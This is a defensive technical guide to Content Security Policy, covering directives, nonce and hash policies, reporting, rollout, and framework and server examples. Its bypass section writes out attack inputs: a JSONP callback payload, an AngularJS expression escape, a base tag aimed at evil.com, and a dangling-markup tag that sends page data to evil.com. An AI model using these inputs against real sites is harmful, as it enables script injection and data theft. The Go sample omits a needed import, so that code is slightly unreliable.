# Content Security Policy (CSP) Deep Dive

## Overview

Content Security Policy is a defense-in-depth mechanism that mitigates cross-site scripting (XSS),
data injection, and clickjacking attacks by controlling which resources a browser is allowed to load
and execute for a given page. Deploy CSP as an HTTP response header or, in limited cases, as a meta
tag. Treat it as a mandatory layer in every production web application.

---

## Table of Contents

1. [How CSP Works](#how-csp-works)
2. [CSP Directives Reference](#csp-directives-reference)
3. [Nonce-Based CSP](#nonce-based-csp)
4. [Hash-Based CSP](#hash-based-csp)
5. [strict-dynamic](#strict-dynamic)
6. [CSP Level 3 Features](#csp-level-3-features)
7. [CSP Reporting](#csp-reporting)
8. [CSP Deployment Strategy](#csp-deployment-strategy)
9. [CSP for Single-Page Applications](#csp-for-single-page-applications)
10. [CSP Bypass Techniques and Prevention](#csp-bypass-techniques-and-prevention)
11. [Trusted Types API](#trusted-types-api)
12. [CSP in Meta Tag vs Header](#csp-in-meta-tag-vs-header)
13. [Implementation Examples](#implementation-examples)
14. [Best Practices](#best-practices)
15. [Anti-Patterns](#anti-patterns)
16. [Enforcement Checklist](#enforcement-checklist)

---

## How CSP Works

The browser receives a `Content-Security-Policy` header (or meta tag) and builds a policy object.
For every resource the page attempts to load or execute, the browser checks the policy. If the
resource violates a directive, the browser blocks it and optionally sends a violation report to a
configured endpoint.

Key principles:

- CSP operates on a whitelist model: everything not explicitly allowed is denied.
- Multiple directives combine to form a complete policy.
- The most specific directive wins; `default-src` provides a fallback.
- Multiple CSP headers are additive (the strictest intersection applies).
- CSP does NOT replace input validation or output encoding; it is a second line of defense.

---

## CSP Directives Reference

### default-src

Set the fallback policy for all fetch directives that are not explicitly specified.

```
Content-Security-Policy: default-src 'self';
```

When `default-src 'self'` is set, any unspecified directive (script-src, style-src, img-src, etc.)
inherits `'self'` as its value. Always define `default-src` as the baseline.

### script-src

Control which scripts the browser may execute. This is the most critical directive for XSS
mitigation.

```
Content-Security-Policy: script-src 'self' 'nonce-abc123' https://cdn.example.com;
```

Source values:

| Value               | Meaning                                              |
|---------------------|------------------------------------------------------|
| `'self'`            | Same origin only                                     |
| `'none'`            | Block all scripts                                    |
| `'unsafe-inline'`   | Allow inline scripts (DANGEROUS -- avoid)            |
| `'unsafe-eval'`     | Allow eval(), Function(), setTimeout(string) (avoid) |
| `'nonce-<value>'`   | Allow scripts with a matching nonce attribute         |
| `'sha256-<hash>'`   | Allow scripts matching the given hash                 |
| `'strict-dynamic'`  | Trust scripts loaded by already-trusted scripts       |
| `https://cdn.ex.com`| Allow scripts from this specific origin               |

### style-src

Control which stylesheets and inline styles the browser may apply.

```
Content-Security-Policy: style-src 'self' 'nonce-xyz789';
```

Avoid `'unsafe-inline'` for styles whenever possible. Use nonces or hashes instead.

### img-src

Control which image sources the browser may load.

```
Content-Security-Policy: img-src 'self' data: https://images.example.com;
```

Include `data:` only when the application genuinely uses data URIs for images. Include `blob:`
only when generating images client-side (e.g., canvas exports).

### connect-src

Control which URLs the application may contact via XHR, fetch, WebSocket, EventSource, and
`navigator.sendBeacon`.

```
Content-Security-Policy: connect-src 'self' https://api.example.com wss://realtime.example.com;
```

Enumerate every API endpoint and real-time connection. Do not use wildcards.

### font-src

Control which font sources the browser may load.

```
Content-Security-Policy: font-src 'self' https://fonts.gstatic.com;
```

### frame-src

Control which URLs may be embedded in `<iframe>`, `<frame>`, and `<object>` elements.

```
Content-Security-Policy: frame-src 'self' https://embed.example.com;
```

Use `frame-src 'none'` when no embedding is required.

### base-uri

Restrict the URLs that may appear in the `<base>` element. An attacker who can inject a `<base>`
tag can redirect all relative URLs to a malicious origin.

```
Content-Security-Policy: base-uri 'self';
```

Always set `base-uri 'self'` or `base-uri 'none'`.

### form-action

Restrict the URLs to which forms may submit data.

```
Content-Security-Policy: form-action 'self' https://auth.example.com;
```

Prevent form hijacking by listing only legitimate submission endpoints.

### frame-ancestors

Control which origins may embed the current page in an iframe. This directive replaces
`X-Frame-Options`.

```
Content-Security-Policy: frame-ancestors 'self';
```

Set to `'none'` if the page should never be embedded. Note that `frame-ancestors` cannot be set
via a `<meta>` tag; use the HTTP header.

### Additional Directives

| Directive          | Purpose                                              |
|--------------------|------------------------------------------------------|
| `media-src`        | Control audio and video sources                      |
| `object-src`       | Control `<object>`, `<embed>`, `<applet>` sources    |
| `child-src`        | Fallback for frame-src and worker-src                |
| `worker-src`       | Control Web Worker, SharedWorker, ServiceWorker URLs |
| `manifest-src`     | Control web app manifest sources                     |
| `prefetch-src`     | Control prefetch and prerender sources               |
| `navigate-to`      | Restrict navigation targets (experimental)           |
| `require-trusted-types-for` | Enforce Trusted Types for DOM sinks        |
| `trusted-types`    | Define allowed Trusted Types policy names            |

---

## Nonce-Based CSP

A nonce is a cryptographically random, single-use token generated server-side for each HTTP
response. Attach the nonce to every legitimate inline `<script>` and `<style>` tag.

### How It Works

1. Generate a random base64 value (minimum 128 bits of entropy) on every request.
2. Include the nonce in the CSP header: `script-src 'nonce-<value>'`.
3. Add the `nonce` attribute to each inline script tag: `<script nonce="<value>">`.
4. The browser executes only scripts whose nonce matches the header.

### Implementation (Node.js / Express)

```javascript
const crypto = require('crypto');
const express = require('express');
const app = express();

app.use((req, res, next) => {
  // Generate a unique nonce per request
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  res.setHeader('Content-Security-Policy', [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self'`,
    `connect-src 'self'`,
    `font-src 'self'`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
    `frame-ancestors 'none'`,
  ].join('; '));

  next();
});

app.get('/', (req, res) => {
  res.send(`
    <html>
      <head>
        <script nonce="${res.locals.cspNonce}">
          console.log('This script is allowed');
        </script>
      </head>
      <body><h1>Nonce-based CSP</h1></body>
    </html>
  `);
});
```

### Critical Rules for Nonces

- Generate a new nonce for every single HTTP response. Never reuse nonces.
- Use a cryptographically secure random number generator (CSPRNG).
- Never expose the nonce in a URL, cookie, or any location an attacker can read.
- Nonce length must be at least 128 bits (16 bytes before base64 encoding).

---

## Hash-Based CSP

Instead of nonces, allow specific inline scripts by referencing the SHA hash of their exact
content.

### Computing Hashes

```bash
echo -n 'console.log("hello");' | openssl dgst -sha256 -binary | openssl base64
```

### Using Hashes in CSP

```
Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng=';
```

### When to Use Hashes vs Nonces

| Factor              | Nonce                          | Hash                           |
|---------------------|--------------------------------|--------------------------------|
| Dynamic content     | Preferred                      | Impractical                    |
| Static inline code  | Works                          | Preferred                      |
| Server rendering    | Easy to inject per request     | Precompute once                |
| CDN-served HTML     | Requires edge compute          | Works with fully static pages  |
| Maintenance         | Transparent to code changes    | Must recompute on code change  |

---

## strict-dynamic

The `'strict-dynamic'` source expression changes CSP's trust model. Instead of whitelisting
origins, trust propagates from an already-trusted script to any scripts it loads.

### Behavior

- When `'strict-dynamic'` is present, host-based allowlist entries (e.g., `https://cdn.example.com`)
  and `'self'` are ignored for script-src.
- Only nonces or hashes grant initial trust.
- Scripts loaded by a trusted script (via `document.createElement('script')`) inherit trust.
- Inline event handlers (`onclick`, `onerror`) remain blocked.
- `'unsafe-inline'` is ignored when `'strict-dynamic'` is present.

### Recommended Strict Policy

```
Content-Security-Policy:
  script-src 'nonce-{random}' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'self';
```

The `https:` and `'unsafe-inline'` entries are backward-compatibility fallbacks for browsers that
do not support `'strict-dynamic'`. CSP3-compliant browsers ignore them when `'strict-dynamic'` is
present.

---

## CSP Level 3 Features

CSP Level 3 introduces several important capabilities:

### script-src-elem and script-src-attr

Separate control over `<script>` elements and inline event handler attributes:

```
Content-Security-Policy:
  script-src-elem 'self' 'nonce-abc123';
  script-src-attr 'none';
```

### style-src-elem and style-src-attr

Separate control over `<style>` / `<link rel="stylesheet">` elements and inline `style=""`
attributes:

```
Content-Security-Policy:
  style-src-elem 'self' 'nonce-xyz789';
  style-src-attr 'unsafe-inline';
```

### worker-src

Dedicated directive for controlling Worker, SharedWorker, and ServiceWorker sources:

```
Content-Security-Policy: worker-src 'self';
```

### navigate-to (Experimental)

Restrict where the document may navigate:

```
Content-Security-Policy: navigate-to 'self' https://auth.example.com;
```

---

## CSP Reporting

### report-uri (Deprecated but Widely Supported)

```
Content-Security-Policy: default-src 'self'; report-uri /csp-report;
```

The browser sends a JSON POST to the specified URI whenever a violation occurs:

```json
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "referrer": "",
    "violated-directive": "script-src 'self'",
    "effective-directive": "script-src",
    "original-policy": "default-src 'self'; report-uri /csp-report",
    "blocked-uri": "https://evil.com/malicious.js",
    "status-code": 200,
    "source-file": "https://example.com/page",
    "line-number": 42,
    "column-number": 8
  }
}
```

### report-to (CSP Level 3)

Use the `Report-To` header in conjunction with the `report-to` directive:

```
Report-To: {"group":"csp-endpoint","max_age":86400,"endpoints":[{"url":"https://report.example.com/csp"}]}
Content-Security-Policy: default-src 'self'; report-to csp-endpoint;
```

### Report-Only Mode

Deploy a policy in monitoring mode without enforcing it:

```
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self'; report-uri /csp-report;
```

Key points:

- Report-Only does NOT block any resources; it only sends violation reports.
- Run Report-Only in parallel with an enforced policy to test policy changes.
- Both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` may coexist.

### Reporting Endpoint Implementation (Express)

```javascript
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body['csp-report'];
  console.warn('CSP Violation:', {
    blockedUri: report['blocked-uri'],
    violatedDirective: report['violated-directive'],
    documentUri: report['document-uri'],
    sourceFile: report['source-file'],
    lineNumber: report['line-number'],
  });
  // Forward to logging/alerting system
  res.status(204).end();
});
```

---

## CSP Deployment Strategy

### Phase 1: Audit and Report-Only

1. Deploy `Content-Security-Policy-Report-Only` with `default-src 'self'` and a report endpoint.
2. Collect violation reports for 2-4 weeks in production.
3. Catalog every legitimate external resource the application loads.
4. Identify all inline scripts and styles that need nonces or refactoring.

### Phase 2: Iterative Tightening

1. Build a policy that allows all legitimate resources found in Phase 1.
2. Deploy the tightened policy in Report-Only mode.
3. Monitor for new violations; adjust the policy as needed.
4. Repeat until violation reports are near zero.

### Phase 3: Enforcement

1. Switch from `Content-Security-Policy-Report-Only` to `Content-Security-Policy`.
2. Keep the report endpoint active for ongoing monitoring.
3. Maintain a Report-Only header with a stricter experimental policy for continuous improvement.

### Phase 4: Ongoing Maintenance

1. Integrate CSP header updates into the CI/CD pipeline.
2. Run automated tests that verify the CSP header is present and correct.
3. Review violation reports weekly.
4. Update the policy whenever new third-party dependencies are added.

---

## CSP for Single-Page Applications

### React

React applications commonly face these CSP challenges:

- Webpack may inject inline scripts for chunk loading. Disable with
  `__webpack_nonce__` or configure `output.crossOriginLoading`.
- Styled-components and Emotion inject inline `<style>` tags. Pass the nonce to the style engine.
- `dangerouslySetInnerHTML` requires careful handling.

```javascript
// Webpack configuration for nonce support
// webpack.config.js
module.exports = {
  output: {
    crossOriginLoading: 'anonymous',
  },
};

// In the entry point, set the nonce for Webpack's dynamic imports
// index.js
__webpack_nonce__ = document.querySelector('meta[name="csp-nonce"]').content;
```

```javascript
// Styled-components nonce support
import { StyleSheetManager } from 'styled-components';

function App() {
  const nonce = document.querySelector('meta[name="csp-nonce"]').content;
  return (
    <StyleSheetManager nonce={nonce}>
      <MainApp />
    </StyleSheetManager>
  );
}
```

### Angular

Angular's AOT compilation avoids most inline script issues. Key considerations:

- Angular CLI uses inline styles by default. Set `"optimization": { "styles": { "inlineCritical": false } }` in `angular.json` or use nonces.
- Angular supports a built-in `ngCspNonce` attribute (Angular 16+).
- For older Angular, configure `ng-csp` and provide a `CSP_NONCE` injection token.

```typescript
// Angular 16+ nonce support in main.ts
import { CSP_NONCE } from '@angular/core';

bootstrapApplication(AppComponent, {
  providers: [
    {
      provide: CSP_NONCE,
      useValue: (document.querySelector('meta[name="csp-nonce"]') as HTMLMetaElement)?.content,
    },
  ],
});
```

### Vue

- Vue 3 does not require `'unsafe-eval'` (Vue 2 runtime compiler does).
- Use the Vue CLI or Vite `html` plugin to inject nonces into generated script and style tags.
- Avoid `v-html` as it injects raw HTML; if necessary, sanitize content first.

```javascript
// Vite configuration for CSP nonces
// vite.config.js
import { defineConfig } from 'vite';
import vue from '@vitejs/plugin-vue';

export default defineConfig({
  plugins: [vue()],
  html: {
    cspNonce: '**CSP_NONCE**', // Placeholder replaced by server middleware
  },
});
```

### General SPA Recommendations

- Serve the SPA shell from a server that can inject a per-request nonce.
- Avoid `'unsafe-eval'` entirely; use production builds of frameworks.
- Set `connect-src` to the exact list of API endpoints.
- Use `'strict-dynamic'` to simplify trust propagation for dynamically loaded chunks.

---

## CSP Bypass Techniques and Prevention

### Bypass 1: JSONP Endpoints on Allowed Origins

If `script-src` allows a CDN that hosts a JSONP endpoint, an attacker can call:

```html
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>
```

**Prevention:** Use `'strict-dynamic'` with nonces instead of origin-based allowlists. Audit
every allowed origin for JSONP endpoints.

### Bypass 2: Angular/Prototype Pollution on Allowed CDNs

Libraries like AngularJS (1.x) can evaluate expressions in templates, bypassing CSP:

```html
<div ng-app ng-csp>{{ constructor.constructor('alert(1)')() }}</div>
```

**Prevention:** Never allow CDNs that host AngularJS 1.x in script-src. Use `'strict-dynamic'`
with nonces.

### Bypass 3: Base Tag Injection

If `base-uri` is not restricted, an attacker can inject:

```html
<base href="https://evil.com/">
```

All relative script paths then resolve to the attacker's server.

**Prevention:** Always set `base-uri 'self'` or `base-uri 'none'`.

### Bypass 4: Dangling Markup Injection

Inject an unclosed tag that captures subsequent page content (including nonces):

```html
<img src="https://evil.com/steal?data=
```

**Prevention:** Use proper output encoding. Set `img-src` restrictively. Modern browsers mitigate
some dangling markup scenarios.

### Bypass 5: Script Gadgets

Pre-existing scripts on the page that transform harmless-looking markup into executable code.

**Prevention:** Audit first-party code for gadget patterns. Use Trusted Types.

### Bypass 6: object-src and plugin-based Execution

Flash and Java applets can execute code outside CSP's script-src scope.

**Prevention:** Always set `object-src 'none'`.

### Bypass 7: Nonce Exfiltration via CSS Injection

CSS attribute selectors can extract nonce values character by character.

**Prevention:** Use separate nonces for scripts and styles. Apply `style-src` restrictions.

---

## Trusted Types API

Trusted Types enforce type safety for dangerous DOM sinks, preventing DOM XSS at the API level.

### Enabling Trusted Types via CSP

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types my-policy default;
```

### Creating a Trusted Types Policy

```javascript
const policy = trustedTypes.createPolicy('my-policy', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (input) => {
    const url = new URL(input, document.baseURI);
    if (url.origin === location.origin) return url.toString();
    throw new TypeError('Untrusted script URL: ' + input);
  },
  createScript: (input) => {
    throw new TypeError('Script creation is not allowed');
  },
});

// Usage
element.innerHTML = policy.createHTML(userInput);
```

### Default Policy

Create a fallback policy named `default` that applies when no other policy is specified:

```javascript
trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (input) => input, // audit and restrict
  createScript: () => { throw new TypeError('Blocked'); },
});
```

### Benefits

- Reduces DOM XSS attack surface to a small number of auditable policy functions.
- Works alongside CSP nonces and strict-dynamic.
- Catches violations at runtime with clear error messages.
- Supported in Chromium-based browsers; use a polyfill for broader support.

---

## CSP in Meta Tag vs Header

### Meta Tag Delivery

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

### Limitations of Meta Tag

- `frame-ancestors` is NOT supported in meta tags (browser ignores it).
- `report-uri` and `report-to` are NOT supported in meta tags.
- `sandbox` is NOT supported in meta tags.
- The meta tag must appear before any resource that it governs. If the meta tag is placed after
  a `<script>` tag, the script may execute before the policy applies.
- Meta tags can be injected by attackers if they find an HTML injection vulnerability, potentially
  creating a more permissive policy.

### Recommendation

Always deliver CSP via the HTTP response header. Use meta tags only as a temporary measure for
static hosting environments that do not support custom headers.

---

## Implementation Examples

### Express / Node.js with Helmet

```javascript
const helmet = require('helmet');
const crypto = require('crypto');

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`, "'strict-dynamic'"],
      styleSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      imgSrc: ["'self'", "data:"],
      connectSrc: ["'self'", "https://api.example.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      upgradeInsecureRequests: [],
    },
  })
);
```

### Nginx

```nginx
server {
    listen 443 ssl;
    server_name example.com;

    # Generate nonce per request using a map or Lua module
    # For static sites, use hash-based CSP instead

    add_header Content-Security-Policy
        "default-src 'self'; "
        "script-src 'self' https://cdn.example.com; "
        "style-src 'self' https://fonts.googleapis.com; "
        "img-src 'self' data:; "
        "font-src 'self' https://fonts.gstatic.com; "
        "connect-src 'self' https://api.example.com; "
        "object-src 'none'; "
        "frame-ancestors 'none'; "
        "base-uri 'self'; "
        "form-action 'self'; "
        "upgrade-insecure-requests; "
        "report-uri /csp-report;"
        always;
}
```

### Django

```python
# settings.py
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'",)
CSP_STYLE_SRC = ("'self'",)
CSP_IMG_SRC = ("'self'", "data:")
CSP_CONNECT_SRC = ("'self'", "https://api.example.com")
CSP_FONT_SRC = ("'self'", "https://fonts.gstatic.com")
CSP_OBJECT_SRC = ("'none'",)
CSP_FRAME_ANCESTORS = ("'none'",)
CSP_BASE_URI = ("'self'",)
CSP_FORM_ACTION = ("'self'",)
CSP_INCLUDE_NONCE_IN = ["script-src", "style-src"]

# Install django-csp middleware
MIDDLEWARE = [
    # ...
    'csp.middleware.CSPMiddleware',
    # ...
]
```

```html
<!-- Django template with nonce -->
{% load csp %}
<script nonce="{% csp_nonce %}">
  console.log('CSP-protected inline script');
</script>
```

### Go

```go
package main

import (
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "net/http"
)

func generateNonce() string {
    b := make([]byte, 16)
    _, err := rand.Read(b)
    if err != nil {
        panic(err)
    }
    return base64.StdEncoding.EncodeToString(b)
}

func cspMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        nonce := generateNonce()
        csp := fmt.Sprintf(
            "default-src 'self'; "+
                "script-src 'self' 'nonce-%s' 'strict-dynamic'; "+
                "style-src 'self' 'nonce-%s'; "+
                "img-src 'self' data:; "+
                "connect-src 'self'; "+
                "object-src 'none'; "+
                "frame-ancestors 'none'; "+
                "base-uri 'self'; "+
                "form-action 'self'",
            nonce, nonce,
        )
        w.Header().Set("Content-Security-Policy", csp)
        // Store nonce in context for template rendering
        ctx := context.WithValue(r.Context(), "cspNonce", nonce)
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}
```

### Spring Boot

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives(
                    "default-src 'self'; " +
                    "script-src 'self' 'nonce-{nonce}'; " +
                    "style-src 'self' 'nonce-{nonce}'; " +
                    "img-src 'self' data:; " +
                    "connect-src 'self' https://api.example.com; " +
                    "object-src 'none'; " +
                    "frame-ancestors 'none'; " +
                    "base-uri 'self'; " +
                    "form-action 'self'"
                )
            )
        );
        return http.build();
    }
}
```

For dynamic nonces in Spring Boot, implement a filter that generates a nonce per request and
makes it available to Thymeleaf templates:

```java
@Component
public class CspNonceFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain) throws ServletException, IOException {
        byte[] nonceBytes = new byte[16];
        SecureRandom.getInstanceStrong().nextBytes(nonceBytes);
        String nonce = Base64.getEncoder().encodeToString(nonceBytes);
        request.setAttribute("cspNonce", nonce);

        String csp = String.format(
            "default-src 'self'; script-src 'self' 'nonce-%s' 'strict-dynamic'; "
            + "style-src 'self' 'nonce-%s'; object-src 'none'; base-uri 'self'; "
            + "frame-ancestors 'none'; form-action 'self'",
            nonce, nonce
        );
        response.setHeader("Content-Security-Policy", csp);
        chain.doFilter(request, response);
    }
}
```

### ASP.NET

```csharp
// Startup.cs or Program.cs
app.Use(async (context, next) =>
{
    var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(16));
    context.Items["CspNonce"] = nonce;

    var csp = $"default-src 'self'; " +
              $"script-src 'self' 'nonce-{nonce}' 'strict-dynamic'; " +
              $"style-src 'self' 'nonce-{nonce}'; " +
              $"img-src 'self' data:; " +
              $"connect-src 'self' https://api.example.com; " +
              $"object-src 'none'; " +
              $"frame-ancestors 'none'; " +
              $"base-uri 'self'; " +
              $"form-action 'self'";

    context.Response.Headers.Append("Content-Security-Policy", csp);
    await next();
});
```

```csharp
// In Razor views, access the nonce
@{
    var nonce = Context.Items["CspNonce"]?.ToString();
}
<script nonce="@nonce">
    console.log('CSP protected');
</script>
```

---

## Best Practices

1. **Start with Report-Only mode.** Deploy `Content-Security-Policy-Report-Only` first. Collect
   violation data for at least two weeks before enforcing. This prevents breaking production
   functionality.

2. **Use nonces with strict-dynamic.** Nonce-based CSP with `'strict-dynamic'` provides the
   strongest protection and simplifies policy management. Avoid host-based allowlists whenever
   possible.

3. **Set object-src to none.** Plugins (Flash, Java, Silverlight) are legacy attack vectors.
   Block them unconditionally with `object-src 'none'`.

4. **Restrict base-uri.** Always set `base-uri 'self'` or `base-uri 'none'` to prevent base tag
   injection attacks.

5. **Set frame-ancestors explicitly.** Use `frame-ancestors 'none'` or `frame-ancestors 'self'`
   to control embedding. This replaces `X-Frame-Options` and is more flexible.

6. **Separate reporting and enforcement policies.** Maintain a Report-Only policy that is stricter
   than the enforced policy. This lets you test tightening before applying it.

7. **Generate nonces with CSPRNG.** Use `crypto.randomBytes` (Node.js), `secrets.token_urlsafe`
   (Python), `SecureRandom` (Java), or `RandomNumberGenerator` (C#). Never use Math.random or
   predictable values.

8. **Automate CSP testing in CI/CD.** Write integration tests that verify the CSP header is
   present, correctly formatted, and contains no unsafe directives. Use tools like csp-evaluator.

9. **Avoid unsafe-inline and unsafe-eval.** These directives negate much of CSP's protection.
   Refactor inline scripts to external files or use nonces. Replace eval with safer alternatives.

10. **Monitor violation reports continuously.** Set up alerts for unusual violation patterns. A
    spike in violations may indicate an active attack or a deployment regression.

---

## Anti-Patterns

1. **Using unsafe-inline without nonces.** Setting `script-src 'unsafe-inline'` without a nonce
   or hash disables XSS protection entirely. Any injected inline script will execute.

2. **Wildcard origins in script-src.** `script-src *` or `script-src https:` allows loading
   scripts from any HTTPS origin, including attacker-controlled servers.

3. **Allowing data: in script-src.** `script-src data:` enables execution of scripts embedded in
   data URIs: `<script src="data:text/javascript,alert(1)"></script>`.

4. **Not setting default-src.** Without `default-src`, unspecified directives default to allowing
   everything, leaving large gaps in the policy.

5. **Reusing nonces across requests.** A static nonce in server configuration (e.g., hardcoded in
   Nginx config) provides zero protection. Nonces must be unique per response.

6. **Ignoring CSP violation reports.** Deploying Report-Only without monitoring the endpoint wastes
   the policy. Reports reveal both misconfigurations and attack attempts.

7. **Placing CSP only in a meta tag.** Meta tags do not support `frame-ancestors`, `report-uri`,
   or `sandbox`. Critical directives are silently ignored.

8. **Overly permissive connect-src.** Setting `connect-src *` or `connect-src https:` allows
   scripts to exfiltrate data to any origin via fetch or XHR.

---

## Enforcement Checklist

Use this checklist before every production deployment:

- [ ] `Content-Security-Policy` header is present on all HTML responses.
- [ ] `default-src` is set to `'self'` or more restrictive.
- [ ] `script-src` uses nonces or hashes with `'strict-dynamic'`; no `'unsafe-inline'` without nonces.
- [ ] `object-src` is set to `'none'`.
- [ ] `base-uri` is set to `'self'` or `'none'`.
- [ ] `frame-ancestors` is set to `'none'` or a specific list of trusted origins.
- [ ] `form-action` is restricted to known submission endpoints.
- [ ] `unsafe-eval` is NOT present in any directive.
- [ ] Nonces are generated with a CSPRNG and are unique per response.
- [ ] CSP reporting endpoint is active and monitored.
- [ ] `Content-Security-Policy-Report-Only` is set with a stricter experimental policy.
- [ ] All third-party origins in the policy are audited for JSONP, open redirects, and script gadgets.
- [ ] CI/CD pipeline includes automated CSP header validation tests.
- [ ] CSP policy has been tested in Report-Only mode for at least two weeks before enforcement.
- [ ] No wildcard (`*`) sources are used in `script-src`, `connect-src`, or `default-src`.
- [ ] `upgrade-insecure-requests` directive is included for HTTPS sites.
- [ ] Trusted Types are enabled where DOM XSS is a concern (`require-trusted-types-for 'script'`).
- [ ] Static analysis tools (e.g., Google CSP Evaluator) have validated the policy.
- [ ] The policy is documented and the team knows the change process for adding new sources.
- [ ] Browser compatibility has been verified for all target browsers.
